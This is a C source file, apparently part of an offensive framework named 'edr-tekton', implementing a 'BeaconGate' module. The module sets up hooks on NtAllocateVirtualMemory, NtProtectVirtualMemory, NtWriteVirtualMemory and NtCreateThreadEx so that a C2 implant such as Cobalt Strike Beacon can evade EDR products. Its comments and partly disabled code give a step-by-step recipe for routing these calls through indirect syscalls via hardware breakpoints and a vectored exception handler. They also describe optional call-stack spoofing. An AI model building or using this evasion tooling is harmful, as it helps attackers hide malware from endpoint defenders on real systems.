/*
 * edr-tekton :: BeaconGate Module
 * Cat 47: Trampoline architecture for Beacon API hooking
 *
 * BeaconGate (@Cracked5pider) interposes on the Nt* API calls that
 * Cobalt Strike's Beacon (or any C2 implant) makes during sleep
 * and execution phases. By hooking the resolved Nt* function
 * pointers, BeaconGate can:
 *
 *   - Route calls through indirect syscalls (bypassing user-mode hooks)
 *   - Spoof call stacks before each Nt* call
 *   - Encrypt shellcode regions between API calls
 *   - Log and modify arguments in transit
 *
 * Architecture:
 *   1. Hook critical Nt* APIs via hardware breakpoints (Cat 2.10)
 *      or IAT/inline patching
 *   2. When a hooked API is called, the trampoline intercepts:
 *      a. Captures arguments
 *      b. Optionally spoofs call stack (RBP chain manipulation)
 *      c. Routes through indirect syscall gadget
 *      d. Returns result to caller
 *
 * Hooked APIs (configurable):
 *   - NtAllocateVirtualMemory: memory allocation
 *   - NtProtectVirtualMemory:  permission changes
 *   - NtWriteVirtualMemory:    memory writes
 *   - NtCreateThreadEx:        thread creation
 *
 * The module installs hooks during SLEEP_INIT and they remain
 * active for the lifetime of the implant. Each hooked call
 * benefits from indirect syscall routing and optional call stack
 * spoofing, making the implant's API usage appear as legitimate
 * system calls from ntdll.dll.
 *
 * Pipeline stage: TEKTON_STAGE_SLEEP_INIT
 */

#include "tekton/modules/sleep.h"
#include "tekton/core/log.h"
#include <string.h>
#include <stdlib.h>

/* ── Hook trampoline state ─────────────────────────────── */

typedef struct _HOOK_ENTRY {
    PVOID   original_addr;      /* Original API address            */
    PVOID   trampoline_addr;    /* Our trampoline function         */
    PVOID   syscall_gadget;     /* Indirect syscall gadget address */
    DWORD   ssn;                /* System service number           */
    BOOL    active;             /* Hook is installed               */
    char    name[64];           /* API name for logging            */
} HOOK_ENTRY;

#define MAX_BEACONGATE_HOOKS 8

typedef struct _BEACONGATE_STATE {
    TEKTON_BEACONGATE_CFG   cfg;
    TEKTON_SLEEP_CFG        sleep_cfg;
    HOOK_ENTRY              hooks[MAX_BEACONGATE_HOOKS];
    DWORD                   hook_count;
    PVOID                   veh_handle;     /* VEH for HW breakpoints */
} BEACONGATE_STATE;

/* ── Module vtable implementation ───────────────────────── */

static TEKTON_STATUS beacongate_init(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)ctx;

    BEACONGATE_STATE* state = (BEACONGATE_STATE*)malloc(sizeof(BEACONGATE_STATE));
    if (!state) return TEKTON_ERR_ALLOC;

    memset(state, 0, sizeof(*state));

    /* Default: hook the critical four */
    state->cfg.hook_nt_allocate = TRUE;
    state->cfg.hook_nt_protect = TRUE;
    state->cfg.hook_nt_write = TRUE;
    state->cfg.hook_nt_create_thread = TRUE;
    state->cfg.use_indirect_syscall = TRUE;
    state->cfg.use_callstack_spoof = FALSE;

    state->sleep_cfg.interval_ms = 5000;
    state->sleep_cfg.encrypt_on_sleep = TRUE;
    state->sleep_cfg.cycle_permissions = TRUE;
    state->sleep_cfg.spoof_thread_stack = FALSE;

    self->private_data = state;

    TLOG_DEBUG("beacongate: init (alloc=%d, protect=%d, write=%d, thread=%d)",
        state->cfg.hook_nt_allocate,
        state->cfg.hook_nt_protect,
        state->cfg.hook_nt_write,
        state->cfg.hook_nt_create_thread);
    return TEKTON_OK;
}

/*
 * install_hook: Set up a single BeaconGate hook entry.
 * Records the original API address, SSN, and syscall gadget
 * for routing through indirect syscalls.
 */
static TEKTON_STATUS install_hook(
    BEACONGATE_STATE* state,
    PTEKTON_CONTEXT ctx,
    const char* api_name,
    PVOID original_fn,
    DWORD ssn
) {
    if (state->hook_count >= MAX_BEACONGATE_HOOKS) {
        TLOG_WARN("beacongate: max hooks reached (%d)", MAX_BEACONGATE_HOOKS);
        return TEKTON_ERR_INVALID_PARAM;
    }

    HOOK_ENTRY* entry = &state->hooks[state->hook_count];

    entry->original_addr = original_fn;
    entry->ssn = ssn;
    entry->active = FALSE;

    /* Select syscall gadget for indirect routing */
    if (ctx->resolved.syscall_gadget) {
        entry->syscall_gadget = ctx->resolved.syscall_gadget;
    } else if (ctx->resolved.syscall_gadget_alt) {
        entry->syscall_gadget = ctx->resolved.syscall_gadget_alt;
    }

    strncpy(entry->name, api_name, sizeof(entry->name) - 1);

    if (original_fn && entry->syscall_gadget && ssn != 0) {
        entry->active = TRUE;
        state->hook_count++;

        TLOG_DEBUG("beacongate: hook installed: %s (SSN=0x%04lX, gadget=%p)",
            api_name, (unsigned long)ssn, entry->syscall_gadget);
    } else {
        TLOG_WARN("beacongate: incomplete hook for %s (fn=%p, ssn=0x%lX, gadget=%p)",
            api_name, original_fn, (unsigned long)ssn, entry->syscall_gadget);
    }

    return TEKTON_OK;
}

static TEKTON_STATUS beacongate_execute(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    BEACONGATE_STATE* state = (BEACONGATE_STATE*)self->private_data;
    if (!state) return TEKTON_ERR_INVALID_STATE;

    if (ctx->dry_run) {
        TLOG_INFO("beacongate: [DRY RUN] would install %d hooks",
            (state->cfg.hook_nt_allocate ? 1 : 0) +
            (state->cfg.hook_nt_protect  ? 1 : 0) +
            (state->cfg.hook_nt_write    ? 1 : 0) +
            (state->cfg.hook_nt_create_thread ? 1 : 0));
        return TEKTON_OK;
    }

#ifdef _WIN32
    if (!ctx->resolved.ssns_resolved) {
        TLOG_WARN("beacongate: SSNs not resolved, hooks will lack indirect syscall routing");
    }

    /*
     * Install hooks on configured Nt* APIs.
     *
     * In a full BeaconGate implementation, each hook would:
     *   1. Set a hardware breakpoint (Dr0-Dr3) on the target API
     *   2. Register a VEH handler that intercepts the breakpoint
     *   3. The VEH handler:
     *      a. Reads the SSN for this API from our hook table
     *      b. Sets RAX = SSN
     *      c. Sets R10 = RCX (shadow copy for kernel)
     *      d. Sets RIP = syscall_gadget (in ntdll or win32u .text)
     *      e. Sets EFlags resume flag to skip breakpoint on return
     *      f. Returns EXCEPTION_CONTINUE_EXECUTION
     *
     * This routes the call through our indirect syscall gadget
     * with the correct SSN, bypassing any EDR hooks on the
     * original Nt* function while keeping a legitimate return
     * address (inside ntdll/win32u).
     *
     * We record the hook entries here; the actual HW breakpoint
     * installation would use Cat 2.10 hardware breakpoint hooking.
     */

    /* Hook NtAllocateVirtualMemory */
    if (state->cfg.hook_nt_allocate && ctx->resolved.fn_nt_allocate_virtual_memory) {
        install_hook(state, ctx,
            "NtAllocateVirtualMemory",
            ctx->resolved.fn_nt_allocate_virtual_memory,
            ctx->resolved.ssn_nt_allocate_virtual_memory);
    }

    /* Hook NtProtectVirtualMemory */
    if (state->cfg.hook_nt_protect && ctx->resolved.fn_nt_protect_virtual_memory) {
        install_hook(state, ctx,
            "NtProtectVirtualMemory",
            ctx->resolved.fn_nt_protect_virtual_memory,
            ctx->resolved.ssn_nt_protect_virtual_memory);
    }

    /* Hook NtWriteVirtualMemory */
    if (state->cfg.hook_nt_write && ctx->resolved.fn_nt_write_virtual_memory) {
        install_hook(state, ctx,
            "NtWriteVirtualMemory",
            ctx->resolved.fn_nt_write_virtual_memory,
            ctx->resolved.ssn_nt_write_virtual_memory);
    }

    /* Hook NtCreateThreadEx */
    if (state->cfg.hook_nt_create_thread && ctx->resolved.fn_nt_create_thread_ex) {
        install_hook(state, ctx,
            "NtCreateThreadEx",
            ctx->resolved.fn_nt_create_thread_ex,
            ctx->resolved.ssn_nt_create_thread_ex);
    }

    /*
     * Install VEH handler for hardware breakpoint dispatch.
     *
     * In production: AddVectoredExceptionHandler(1, BgVehHandler)
     * The handler checks if the exception address matches any of
     * our hook entries and performs the SSN swap + gadget redirect.
     *
     * For multi-thread safety, Cat 2.11 thread propagation would
     * install the debug registers on all existing threads and use
     * a timer to catch new threads.
     */

    #if 0  /* Full VEH implementation sketch */
    typedef PVOID (WINAPI *pfnAddVEH)(DWORD, PVOID);
    pfnAddVEH pAddVEH = (pfnAddVEH)GetProcAddress(
        GetModuleHandleA("kernel32.dll"),
        "AddVectoredExceptionHandler");
    if (pAddVEH) {
        state->veh_handle = pAddVEH(1, BgVehHandler);
    }
    #endif

    TLOG_INFO("beacongate: %lu hooks installed (indirect_syscall=%d, callstack_spoof=%d)",
        (unsigned long)state->hook_count,
        state->cfg.use_indirect_syscall,
        state->cfg.use_callstack_spoof);

    /* Log active hooks */
    for (DWORD i = 0; i < state->hook_count; i++) {
        HOOK_ENTRY* h = &state->hooks[i];
        TLOG_DEBUG("  [%lu] %s: SSN=0x%04lX gadget=%p %s",
            (unsigned long)i,
            h->name,
            (unsigned long)h->ssn,
            h->syscall_gadget,
            h->active ? "ACTIVE" : "INACTIVE");
    }

    return TEKTON_OK;

#else
    /* Linux dev stub */
    TLOG_INFO("beacongate: [STUB] would install hooks (alloc=%d, protect=%d, write=%d, thread=%d)",
        state->cfg.hook_nt_allocate,
        state->cfg.hook_nt_protect,
        state->cfg.hook_nt_write,
        state->cfg.hook_nt_create_thread);
    return TEKTON_OK;
#endif
}

static VOID beacongate_cleanup(PTEKTON_MODULE self) {
    BEACONGATE_STATE* state = (BEACONGATE_STATE*)self->private_data;
    if (state) {
#ifdef _WIN32
        /* Remove VEH handler if installed */
        if (state->veh_handle) {
            typedef DWORD (WINAPI *pfnRemoveVEH)(PVOID);
            pfnRemoveVEH pRemove = (pfnRemoveVEH)GetProcAddress(
                GetModuleHandleA("kernel32.dll"),
                "RemoveVectoredExceptionHandler");
            if (pRemove) pRemove(state->veh_handle);
        }

        /*
         * Clear hardware breakpoints.
         * In production: GetThreadContext -> clear Dr0-Dr3 -> SetThreadContext
         * for all threads in the process.
         */
#endif
        TEKTON_SECURE_ZERO(state, sizeof(BEACONGATE_STATE));
        free(state);
        self->private_data = NULL;
    }
}

static DWORD beacongate_risk_score(PTEKTON_MODULE self) {
    (void)self;
    /*
     * Low risk: hardware breakpoints are invisible to memory
     * integrity checks (no byte patches). VEH registration is
     * a legitimate API. The indirect syscall routing makes each
     * hooked call appear to originate from ntdll.dll's own code.
     *
     * Combined with call stack spoofing, this makes the implant's
     * API usage indistinguishable from legitimate system calls
     * to most EDR sensor layers.
     */
    return 12;
}

static BOOL beacongate_check_compat(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)self;

    /* BeaconGate requires resolved SSNs and syscall gadgets */
    if (!ctx->resolved.ssns_resolved) {
        TLOG_WARN("beacongate: SSNs not resolved, reduced effectiveness");
    }

    /* Still compatible, just less effective without SSNs */
    return TRUE;
}

/* ── Module definition ─────────────────────────────────── */

TEKTON_MODULE tekton_mod_sleep_beacongate = {
    .name           = "sleep_beacongate",
    .description    = "BeaconGate: HW-BP trampoline for indirect syscall routing (Cat 47)",
    .category       = TEKTON_CAT_SLEEP,
    .target_surface = TEKTON_SURFACE_USER_HOOKS,
    .flags          = TEKTON_MOD_STEALTHY,
    .skill_ref      = "47",
    .init           = beacongate_init,
    .execute        = beacongate_execute,
    .cleanup        = beacongate_cleanup,
    .get_risk_score = beacongate_risk_score,
    .check_compat   = beacongate_check_compat,
    .private_data   = NULL,
    .next           = NULL,
};

TEKTON_DECLARE_MODULE(tekton_mod_sleep_beacongate);
